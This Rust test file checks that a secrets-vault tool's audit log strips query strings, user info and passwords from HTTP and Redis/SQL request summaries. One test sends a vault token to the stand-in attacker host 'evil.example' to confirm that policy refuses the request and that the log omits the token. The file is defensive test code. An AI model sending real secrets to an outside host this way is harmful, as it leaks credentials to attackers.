//! What the audit log keeps of a request: never a vault value, a query
//! string, user info, or a password the agent typed into a command.

mod common;

use common::*;
use kv::audit::{db_summary, http_summary};
use kv_core::policy::Mode;

#[test]
fn http_summary_drops_query_fragment_and_user_info() {
    assert_eq!(
        http_summary("GET", "https://api.example.com/v1/items?key=abc123&x=1"),
        "GET https://api.example.com/v1/items?…"
    );
    assert_eq!(
        http_summary("GET", "https://user:pa55word@api.example.com/v1#frag"),
        "GET https://api.example.com/v1?…"
    );
    assert_eq!(
        http_summary("POST", "https://api.example.com/v1/items"),
        "POST https://api.example.com/v1/items"
    );
    // A path for a handle with a hidden base URL.
    assert_eq!(
        http_summary("GET", "/project.all?token=abc"),
        "GET /project.all?…"
    );
    // An @ in the path is not user info.
    assert_eq!(
        http_summary("GET", "https://api.example.com/users/@me"),
        "GET https://api.example.com/users/@me"
    );
}

#[test]
fn http_summary_is_cut_short() {
    let long = format!("https://api.example.com/{}", "a".repeat(1000));
    let summary = http_summary("GET", &long);
    assert_eq!(summary.chars().count(), 300);
    assert!(summary.ends_with('…'));
}

#[test]
fn db_summary_keeps_only_the_name_of_redis_credential_commands() {
    assert_eq!(db_summary("AUTH default s3cret-pass"), "AUTH …");
    assert_eq!(db_summary("auth s3cret-pass"), "AUTH …");
    assert_eq!(db_summary("HELLO 3 AUTH default s3cret"), "HELLO …");
    assert_eq!(db_summary("ACL SETUSER bob >s3cret on"), "ACL …");
    assert_eq!(db_summary("CONFIG SET requirepass s3cret"), "CONFIG …");
    assert_eq!(
        db_summary("MIGRATE h 6379 k 0 5000 AUTH s3cret"),
        "MIGRATE …"
    );
    assert_eq!(db_summary("AUTH"), "AUTH");
    assert_eq!(db_summary("HGETALL user:1"), "HGETALL user:1");
}

#[test]
fn db_summary_cuts_sql_before_a_password() {
    assert_eq!(
        db_summary("ALTER ROLE app WITH PASSWORD 's3cret'"),
        "ALTER ROLE app WITH …"
    );
    assert_eq!(
        db_summary("create user bob password 's3cret'"),
        "create user bob …"
    );
    assert_eq!(db_summary("SELECT 1"), "SELECT 1");
    let long = format!("SELECT '{}'", "x".repeat(500));
    assert_eq!(db_summary(&long).chars().count(), 200);
}

#[test]
fn a_refused_request_logs_no_value_and_no_query() {
    let mut f = Fixture::new();
    f.add(openrouter(Mode::Auto));
    // Refused by policy: the host is not allowed.
    let url = format!("https://evil.example/{TOKEN}/x?key={TOKEN}");
    assert!(f.http(get("openrouter", &url)).is_err());

    let log = std::fs::read_to_string(f.dir.path().join("audit.jsonl")).unwrap();
    assert!(!log.contains(TOKEN), "{log}");
    assert!(!log.contains("key="), "{log}");
    let line = f
        .audit_lines()
        .into_iter()
        .find(|l| l["action"] == "http_request")
        .unwrap();
    assert_eq!(
        line["summary"],
        "GET https://evil.example/[kv:openrouter]/x?…"
    );
}

#[test]
fn a_refused_redis_auth_logs_only_the_command_name() {
    let mut f = Fixture::new();
    f.add(redis("cache", "redis://127.0.0.1:6379/0", true, Mode::Auto));
    assert!(f.db(query("cache", "AUTH default s3cret-pass")).is_err());

    let log = std::fs::read_to_string(f.dir.path().join("audit.jsonl")).unwrap();
    assert!(!log.contains("s3cret-pass"), "{log}");
    let line = f
        .audit_lines()
        .into_iter()
        .find(|l| l["action"] == "db_query")
        .unwrap();
    assert_eq!(line["summary"], "AUTH …");
}
